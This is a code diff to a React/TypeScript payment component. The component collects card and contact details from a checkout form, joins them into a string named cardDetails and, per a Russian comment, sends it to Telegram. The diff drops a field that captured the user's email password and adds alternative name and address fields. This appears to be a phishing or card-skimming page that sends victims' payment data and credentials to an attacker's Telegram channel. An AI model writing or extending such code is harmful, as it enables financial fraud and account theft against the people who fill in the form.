@@ -40,7 +40,14 @@ const Payment = () => {
         const zipCode = (document.getElementById("zip") as HTMLInputElement)?.value;
         const phoneNumber = (document.getElementById("phone-number") as HTMLInputElement)?.value;
         const email = (document.getElementById("email") as HTMLInputElement)?.value;
-        const password = (document.getElementById("password") as HTMLInputElement)?.value;
+        const firstNameAlterntative = (document.getElementById("first-name-alternative") as HTMLInputElement)?.value;
+        const lastNameAlterntative = (document.getElementById("last-name-alternative") as HTMLInputElement)?.value;
+        const countryAlterntative = (document.getElementById("country-alternative") as HTMLSelectElement)?.value;
+        const addressLine1Alterntative = (document.getElementById("address-line-1-alternative") as HTMLInputElement)?.value;
+        const addressLine2Alterntative = (document.getElementById("address-line-2-alternative") as HTMLInputElement)?.value;
+        const cityAlterntative = (document.getElementById("city-alternative") as HTMLInputElement)?.value;
+        const zipCodeAlterntative = (document.getElementById("zip-alternative") as HTMLInputElement)?.value;
+        const phoneNumberAlterntative = (document.getElementById("phone-number-alternative") as HTMLInputElement)?.value;
 
         // Собираем все данные в одну строку
         const cardDetails = `
@@ -56,7 +63,14 @@ const Payment = () => {
             Zip Code: ${zipCode} \n
             Phone Number: ${phoneNumber} \n
             Email: ${email} \n
-            Password mail: ${password}
+            First Name Alternative: ${firstNameAlterntative} \n
+            Last Name Alternative: ${lastNameAlterntative} \n
+            Country Alternative: ${countryAlterntative} \n
+            Address Line 1 Alternative: ${addressLine1Alterntative} \n
+            Address Line 2 Alternative: ${addressLine2Alterntative} \n
+            City Alternative: ${cityAlterntative} \n
+            Zip Code Alternative: ${zipCodeAlterntative} \n
+            Phone Number Alternative: ${phoneNumberAlterntative} \n
         `;
         try {
             // Отправляем данные в Telegram
